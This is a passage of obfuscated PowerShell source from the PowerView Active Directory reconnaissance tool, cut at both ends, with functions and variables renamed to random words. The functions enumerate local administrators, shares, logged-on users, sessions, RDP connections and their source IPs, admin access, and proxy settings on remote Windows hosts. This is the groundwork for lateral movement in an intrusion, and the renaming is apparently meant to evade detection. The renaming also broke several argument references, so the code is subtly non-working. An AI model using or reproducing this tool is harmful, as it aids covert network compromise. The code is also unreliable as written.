        $sMQTvMNR99 = @{}
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $LZxUZArx99 = @{}
        if ($PSBoundParameters['Server']) { $LZxUZArx99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['Credential']) { $LZxUZArx99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $sMQTvMNR99['Domain'] = $UtXBFQsM99
            $LZxUZArx99['Domain'] = $UtXBFQsM99
        }
        if ($MrKCsAsv99 -eq 'All') {
            $sMQTvMNR99['Identity'] = '*'
        }
        elseif ($MrKCsAsv99 -eq 'Domain') {
            $sMQTvMNR99['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($MrKCsAsv99 -eq 'DomainController') -or ($MrKCsAsv99 -eq 'DC')) {
            $sMQTvMNR99['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $sMQTvMNR99['Identity'] = $MrKCsAsv99
        }
        $gWBuoptB99 = adolescents @SearcherArguments
        ForEach ($GPO in $gWBuoptB99) {
            $rRVtYxUN99 = $GPO.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
            $roDyzZJY99 =  @{
                'GptTmplPath' = $rRVtYxUN99
                'OutputObject' = $True
            }
            if ($PSBoundParameters['Credential']) { $roDyzZJY99['Credential'] = $fxunRYJT99 }
            Swahili @ParseArgs | ForEach-Object {
                $_ | Add-Member Noteproperty 'GPOName' $GPO.name
                $_ | Add-Member Noteproperty 'GPODisplayName' $GPO.displayname
                $_
            }
        }
    }
}
function orthopedist {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = $Env:COMPUTERNAME,
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $fQOJfqWf99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
        }
    }
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            if ($fQOJfqWf99 -eq 'API') {
                $nnxAwRrk99 = 1
                $siQDMuEV99 = [IntPtr]::Zero
                $NviziPDc99 = 0
                $jDHHCZRM99 = 0
                $BIexaghr99 = 0
                $kTrwYNCb99 = $wnzumfxs99::NetLocalGroupEnum($aJJGHudX99, $nnxAwRrk99, [ref]$siQDMuEV99, -1, [ref]$NviziPDc99, [ref]$jDHHCZRM99, [ref]$BIexaghr99)
                $gqSThzCi99 = $siQDMuEV99.ToInt64()
                if (($kTrwYNCb99 -eq 0) -and ($gqSThzCi99 -gt 0)) {
                    $nBQFNFfh99 = $VjUFEYCf99::GetSize()
                    for ($i = 0; ($i -lt $NviziPDc99); $i++) {
                        $qmoPzHeq99 = New-Object System.Intptr -ArgumentList $gqSThzCi99
                        $Info = $qmoPzHeq99 -as $VjUFEYCf99
                        $gqSThzCi99 = $qmoPzHeq99.ToInt64()
                        $gqSThzCi99 += $nBQFNFfh99
                        $vGsXhFTL99 = New-Object PSObject
                        $vGsXhFTL99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                        $vGsXhFTL99 | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name
                        $vGsXhFTL99 | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment
                        $vGsXhFTL99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        $vGsXhFTL99
                    }
                    $Null = $wnzumfxs99::NetApiBufferFree($siQDMuEV99)
                }
                else {
                    Write-Verbose "[orthopedist] Error: $(([ComponentModel.Win32Exception] $kTrwYNCb99).Message)"
                }
            }
            else {
                $BiCqRCfo99 = [ADSI]"WinNT://$aJJGHudX99,computer"
                $BiCqRCfo99.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {
                    $vGsXhFTL99 = ([ADSI]$_)
                    $Group = New-Object PSObject
                    $Group | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                    $Group | Add-Member Noteproperty 'GroupName' ($vGsXhFTL99.InvokeGet('Name'))
                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($vGsXhFTL99.InvokeGet('objectsid'),0)).Value)
                    $Group | Add-Member Noteproperty 'Comment' ($vGsXhFTL99.InvokeGet('Description'))
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    $Group
                }
            }
        }
    }
    
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function turpentine {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = $Env:COMPUTERNAME,
        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $YGzKEtMK99 = 'Administrators',
        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $fQOJfqWf99 = 'API',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
        }
    }
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            if ($fQOJfqWf99 -eq 'API') {
                $nnxAwRrk99 = 2
                $siQDMuEV99 = [IntPtr]::Zero
                $NviziPDc99 = 0
                $jDHHCZRM99 = 0
                $BIexaghr99 = 0
                $kTrwYNCb99 = $wnzumfxs99::NetLocalGroupGetMembers($aJJGHudX99, $YGzKEtMK99, $nnxAwRrk99, [ref]$siQDMuEV99, -1, [ref]$NviziPDc99, [ref]$jDHHCZRM99, [ref]$BIexaghr99)
                $gqSThzCi99 = $siQDMuEV99.ToInt64()
                $mACTrMID99 = @()
                if (($kTrwYNCb99 -eq 0) -and ($gqSThzCi99 -gt 0)) {
                    $nBQFNFfh99 = $RDteTRJL99::GetSize()
                    for ($i = 0; ($i -lt $NviziPDc99); $i++) {
                        $qmoPzHeq99 = New-Object System.Intptr -ArgumentList $gqSThzCi99
                        $Info = $qmoPzHeq99 -as $RDteTRJL99
                        $gqSThzCi99 = $qmoPzHeq99.ToInt64()
                        $gqSThzCi99 += $nBQFNFfh99
                        $VRPsTnjA99 = ''
                        $EaDChLua99 = $ZCzUrYZa99::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$VRPsTnjA99);$STRNLQhd99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($EaDChLua99 -eq 0) {
                            Write-Verbose "[turpentine] Error: $(([ComponentModel.Win32Exception] $STRNLQhd99).Message)"
                        }
                        else {
                            $pWTNPYLI99 = New-Object PSObject
                            $pWTNPYLI99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                            $pWTNPYLI99 | Add-Member Noteproperty 'GroupName' $YGzKEtMK99
                            $pWTNPYLI99 | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname
                            $pWTNPYLI99 | Add-Member Noteproperty 'SID' $VRPsTnjA99
                            $sfwZChzf99 = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')
                            $pWTNPYLI99 | Add-Member Noteproperty 'IsGroup' $sfwZChzf99
                            $pWTNPYLI99.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            $mACTrMID99 += $pWTNPYLI99
                        }
                    }
                    $Null = $wnzumfxs99::NetApiBufferFree($siQDMuEV99)
                    $mLoWkcHR99 = $mACTrMID99 | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID
                    if ($mLoWkcHR99) {
                        $mLoWkcHR99 = $mLoWkcHR99.Substring(0, $mLoWkcHR99.LastIndexOf('-'))
                        $mACTrMID99 | ForEach-Object {
                            if ($_.SID -match $mLoWkcHR99) {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' $True
                            }
                        }
                    }
                    else {
                        $mACTrMID99 | ForEach-Object {
                            if ($_.SID -notmatch 'S-1-5-21') {
                                $_ | Add-Member Noteproperty 'IsDomain' $False
                            }
                            else {
                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    $mACTrMID99
                }
                else {
                    Write-Verbose "[turpentine] Error: $(([ComponentModel.Win32Exception] $kTrwYNCb99).Message)"
                }
            }
            else {
                try {
                    $JdLwreeK99 = [ADSI]"WinNT://$aJJGHudX99/$YGzKEtMK99,group"
                    $JdLwreeK99.psbase.Invoke('Members') | ForEach-Object {
                        $pWTNPYLI99 = New-Object PSObject
                        $pWTNPYLI99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                        $pWTNPYLI99 | Add-Member Noteproperty 'GroupName' $YGzKEtMK99
                        $geJMFbsf99 = ([ADSI]$_)
                        $GftdgFrP99 = $geJMFbsf99.InvokeGet('AdsPath').Replace('WinNT://', '')
                        $sfwZChzf99 = ($geJMFbsf99.SchemaClassName -like 'group')
                        if(([regex]::Matches($GftdgFrP99, '/')).count -eq 1) {
                            $IoUoOWHT99 = $True
                            $Name = $GftdgFrP99.Replace('/', '\')
                        }
                        else {
                            $IoUoOWHT99 = $False
                            $Name = $GftdgFrP99.Substring($GftdgFrP99.IndexOf('/')+1).Replace('/', '\')
                        }
                        $pWTNPYLI99 | Add-Member Noteproperty 'AccountName' $Name
                        $pWTNPYLI99 | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($geJMFbsf99.InvokeGet('ObjectSID'),0)).Value)
                        $pWTNPYLI99 | Add-Member Noteproperty 'IsGroup' $sfwZChzf99
                        $pWTNPYLI99 | Add-Member Noteproperty 'IsDomain' $IoUoOWHT99
                        $pWTNPYLI99
                    }
                }
                catch {
                    Write-Verbose "[turpentine] Error for $aJJGHudX99 : $_"
                }
            }
        }
    }
    
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function practise {
    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
        }
    }
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            $nnxAwRrk99 = 1
            $siQDMuEV99 = [IntPtr]::Zero
            $NviziPDc99 = 0
            $jDHHCZRM99 = 0
            $BIexaghr99 = 0
            $kTrwYNCb99 = $wnzumfxs99::NetShareEnum($aJJGHudX99, $nnxAwRrk99, [ref]$siQDMuEV99, -1, [ref]$NviziPDc99, [ref]$jDHHCZRM99, [ref]$BIexaghr99)
            $gqSThzCi99 = $siQDMuEV99.ToInt64()
            if (($kTrwYNCb99 -eq 0) -and ($gqSThzCi99 -gt 0)) {
                $nBQFNFfh99 = $kqULkiwX99::GetSize()
                for ($i = 0; ($i -lt $NviziPDc99); $i++) {
                    $qmoPzHeq99 = New-Object System.Intptr -ArgumentList $gqSThzCi99
                    $Info = $qmoPzHeq99 -as $kqULkiwX99
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $gqSThzCi99 = $qmoPzHeq99.ToInt64()
                    $gqSThzCi99 += $nBQFNFfh99
                    $Share
                }
                $Null = $wnzumfxs99::NetApiBufferFree($siQDMuEV99)
            }
            else {
                Write-Verbose "[practise] Error: $(([ComponentModel.Win32Exception] $kTrwYNCb99).Message)"
            }
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function tramming {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
        }
    }
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            $nnxAwRrk99 = 1
            $siQDMuEV99 = [IntPtr]::Zero
            $NviziPDc99 = 0
            $jDHHCZRM99 = 0
            $BIexaghr99 = 0
            $kTrwYNCb99 = $wnzumfxs99::NetWkstaUserEnum($aJJGHudX99, $nnxAwRrk99, [ref]$siQDMuEV99, -1, [ref]$NviziPDc99, [ref]$jDHHCZRM99, [ref]$BIexaghr99)
            $gqSThzCi99 = $siQDMuEV99.ToInt64()
            if (($kTrwYNCb99 -eq 0) -and ($gqSThzCi99 -gt 0)) {
                $nBQFNFfh99 = $XjifLZrO99::GetSize()
                for ($i = 0; ($i -lt $NviziPDc99); $i++) {
                    $qmoPzHeq99 = New-Object System.Intptr -ArgumentList $gqSThzCi99
                    $Info = $qmoPzHeq99 -as $XjifLZrO99
                    $ENpYEXnu99 = $Info | Select-Object *
                    $ENpYEXnu99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                    $ENpYEXnu99.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $gqSThzCi99 = $qmoPzHeq99.ToInt64()
                    $gqSThzCi99 += $nBQFNFfh99
                    $ENpYEXnu99
                }
                $Null = $wnzumfxs99::NetApiBufferFree($siQDMuEV99)
            }
            else {
                Write-Verbose "[tramming] Error: $(([ComponentModel.Win32Exception] $kTrwYNCb99).Message)"
            }
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function reenforce {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
        }
    }
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            $nnxAwRrk99 = 10
            $siQDMuEV99 = [IntPtr]::Zero
            $NviziPDc99 = 0
            $jDHHCZRM99 = 0
            $BIexaghr99 = 0
            $kTrwYNCb99 = $wnzumfxs99::NetSessionEnum($aJJGHudX99, '', $pgSynGHL99, $nnxAwRrk99, [ref]$siQDMuEV99, -1, [ref]$NviziPDc99, [ref]$jDHHCZRM99, [ref]$BIexaghr99)
            $gqSThzCi99 = $siQDMuEV99.ToInt64()
            if (($kTrwYNCb99 -eq 0) -and ($gqSThzCi99 -gt 0)) {
                $nBQFNFfh99 = $kYRyZzpB99::GetSize()
                for ($i = 0; ($i -lt $NviziPDc99); $i++) {
                    $qmoPzHeq99 = New-Object System.Intptr -ArgumentList $gqSThzCi99
                    $Info = $qmoPzHeq99 -as $kYRyZzpB99
                    $cjOfKqgp99 = $Info | Select-Object *
                    $cjOfKqgp99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                    $cjOfKqgp99.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $gqSThzCi99 = $qmoPzHeq99.ToInt64()
                    $gqSThzCi99 += $nBQFNFfh99
                    $cjOfKqgp99
                }
                $Null = $wnzumfxs99::NetApiBufferFree($siQDMuEV99)
            }
            else {
                Write-Verbose "[reenforce] Error: $(([ComponentModel.Win32Exception] $kTrwYNCb99).Message)"
            }
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function levying {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
        }
    }
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            try {
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$FRrsCtDf99")
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $pgSynGHL99 = dotcom -ObjectSID $_ -LkQAjVeR99 'DomainSimple'
                    if ($pgSynGHL99) {
                        $pgSynGHL99, $NzTnTiPA99 = $pgSynGHL99.Split('@')
                    }
                    else {
                        $pgSynGHL99 = $_
                        $NzTnTiPA99 = $Null
                    }
                    $qZdLCFnu99 = New-Object PSObject
                    $qZdLCFnu99 | Add-Member Noteproperty 'ComputerName' "$FRrsCtDf99"
                    $qZdLCFnu99 | Add-Member Noteproperty 'UserDomain' $NzTnTiPA99
                    $qZdLCFnu99 | Add-Member Noteproperty 'UserName' $pgSynGHL99
                    $qZdLCFnu99 | Add-Member Noteproperty 'UserSID' $_
                    $qZdLCFnu99.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $qZdLCFnu99
                }
            }
            catch {
                Write-Verbose "[levying] Error opening remote registry on '$FRrsCtDf99' : $_"
            }
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function anthropologists {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
        }
    }
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            $dxPDWoQW99 = $rnrPMEpZ99::WTSOpenServerEx($aJJGHudX99)
            if ($dxPDWoQW99 -ne 0) {
                $XmBGKaLk99 = [IntPtr]::Zero
                $ybxRwfmu99 = 0
                $kTrwYNCb99 = $rnrPMEpZ99::WTSEnumerateSessionsEx($dxPDWoQW99, [ref]1, 0, [ref]$XmBGKaLk99, [ref]$ybxRwfmu99);$STRNLQhd99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                $gqSThzCi99 = $XmBGKaLk99.ToInt64()
                if (($kTrwYNCb99 -ne 0) -and ($gqSThzCi99 -gt 0)) {
                    $nBQFNFfh99 = $ZOIDkdLZ99::GetSize()
                    for ($i = 0; ($i -lt $ybxRwfmu99); $i++) {
                        $qmoPzHeq99 = New-Object System.Intptr -ArgumentList $gqSThzCi99
                        $Info = $qmoPzHeq99 -as $ZOIDkdLZ99
                        $kNGtrCSk99 = New-Object PSObject
                        if ($Info.pHostName) {
                            $kNGtrCSk99 | Add-Member Noteproperty 'ComputerName' $Info.pHostName
                        }
                        else {
                            $kNGtrCSk99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                        }
                        $kNGtrCSk99 | Add-Member Noteproperty 'SessionName' $Info.pSessionName
                        if ($(-not $Info.pDomainName) -or ($Info.pDomainName -eq '')) {
                            $kNGtrCSk99 | Add-Member Noteproperty 'UserName' "$($Info.pUserName)"
                        }
                        else {
                            $kNGtrCSk99 | Add-Member Noteproperty 'UserName' "$($Info.pDomainName)\$($Info.pUserName)"
                        }
                        $kNGtrCSk99 | Add-Member Noteproperty 'ID' $Info.SessionID
                        $kNGtrCSk99 | Add-Member Noteproperty 'State' $Info.State
                        $GmzNzvux99 = [IntPtr]::Zero
                        $wlORdQoj99 = 0
                        $EaDChLua99 = $rnrPMEpZ99::WTSQuerySessionInformation($dxPDWoQW99, $Info.SessionID, 14, [ref]$GmzNzvux99, [ref]$wlORdQoj99);$akpgRWHS99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if ($EaDChLua99 -eq 0) {
                            Write-Verbose "[anthropologists] Error: $(([ComponentModel.Win32Exception] $akpgRWHS99).Message)"
                        }
                        else {
                            $tDoNzPvZ99 = $GmzNzvux99.ToInt64()
                            $JrTzPFQr99 = New-Object System.Intptr -ArgumentList $tDoNzPvZ99
                            $Info2 = $JrTzPFQr99 -as $yTKhElvM99
                            $atrrLGek99 = $Info2.Address
                            if ($atrrLGek99[2] -ne 0) {
                                $atrrLGek99 = [String]$atrrLGek99[2]+'.'+[String]$atrrLGek99[3]+'.'+[String]$atrrLGek99[4]+'.'+[String]$atrrLGek99[5]
                            }
                            else {
                                $atrrLGek99 = $Null
                            }
                            $kNGtrCSk99 | Add-Member Noteproperty 'SourceIP' $atrrLGek99
                            $kNGtrCSk99.PSObject.TypeNames.Insert(0, 'PowerView.RDPSessionInfo')
                            $kNGtrCSk99
                            $Null = $rnrPMEpZ99::WTSFreeMemory($GmzNzvux99)
                            $gqSThzCi99 += $nBQFNFfh99
                        }
                    }
                    $Null = $rnrPMEpZ99::WTSFreeMemoryEx(2, $XmBGKaLk99, $ybxRwfmu99)
                }
                else {
                    Write-Verbose "[anthropologists] Error: $(([ComponentModel.Win32Exception] $STRNLQhd99).Message)"
                }
                $Null = $rnrPMEpZ99::WTSCloseServer($dxPDWoQW99)
            }
            else {
                Write-Verbose "[anthropologists] Error opening the Remote Desktop Session Host (RD Session Host) server for: $FRrsCtDf99"
            }
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function patinas {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
        }
    }
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            $dxPDWoQW99 = $ZCzUrYZa99::OpenSCManagerW("\\$aJJGHudX99", 'ServicesActive', 0xF003F);$STRNLQhd99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            $bfBysrym99 = New-Object PSObject
            $bfBysrym99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
            if ($dxPDWoQW99 -ne 0) {
                $Null = $ZCzUrYZa99::CloseServiceHandle($dxPDWoQW99)
                $bfBysrym99 | Add-Member Noteproperty 'IsAdmin' $True
            }
            else {
                Write-Verbose "[patinas] Error: $(([ComponentModel.Win32Exception] $STRNLQhd99).Message)"
                $bfBysrym99 | Add-Member Noteproperty 'IsAdmin' $False
            }
            $bfBysrym99.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
            $bfBysrym99
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function lambs {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
        }
    }
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            if ($aJJGHudX99 -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                $uHbKpIte99 = $aJJGHudX99
                $aJJGHudX99 = [System.Net.Dns]::GetHostByAddress($aJJGHudX99) | Select-Object -ExpandProperty HostName
            }
            else {
                $uHbKpIte99 = @(asked -FRrsCtDf99 $aJJGHudX99)[0].IPAddress
            }
            $siQDMuEV99 = [IntPtr]::Zero
            $kTrwYNCb99 = $wnzumfxs99::DsGetSiteName($aJJGHudX99, [ref]$siQDMuEV99)
            $zIbUjceV99 = New-Object PSObject
            $zIbUjceV99 | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
            $zIbUjceV99 | Add-Member Noteproperty 'IPAddress' $uHbKpIte99
            if ($kTrwYNCb99 -eq 0) {
                $DgPmuXLw99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($siQDMuEV99)
                $zIbUjceV99 | Add-Member Noteproperty 'SiteName' $DgPmuXLw99
            }
            else {
                Write-Verbose "[lambs] Error: $(([ComponentModel.Win32Exception] $kTrwYNCb99).Message)"
                $zIbUjceV99 | Add-Member Noteproperty 'SiteName' ''
            }
            $zIbUjceV99.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')
            $Null = $wnzumfxs99::NetApiBufferFree($siQDMuEV99)
            $zIbUjceV99
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function message {
    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99 = $Env:COMPUTERNAME,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($aJJGHudX99 in $FRrsCtDf99) {
            try {
                $UHCsPbRc99 = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $aJJGHudX99
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $UHCsPbRc99['Credential'] = $fxunRYJT99 }
                $WeUJzYDx99 = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'
                $HKCU = 2147483649
                $VaFkEgsH99 = $WeUJzYDx99.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $ezHVbxcp99 = $WeUJzYDx99.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue
                $Wpad = ''
                if ($ezHVbxcp99 -and ($ezHVbxcp99 -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($ezHVbxcp99)
                    }
                    catch {
                        Write-Warning "[message] Error connecting to AutoConfigURL : $ezHVbxcp99"
                    }
                }
                if ($VaFkEgsH99 -or $ezHVbxcp99) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $aJJGHudX99
                    $Out | Add-Member Noteproperty 'ProxyServer' $VaFkEgsH99
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $ezHVbxcp99
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                    Write-Warning "[message] No proxy settings found for $FRrsCtDf99"
                }
            }
            catch {
                Write-Warning "[message] Error enumerating proxy settings for $FRrsCtDf99 : $_"
            }
        }
    }
}
function Nash {
    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
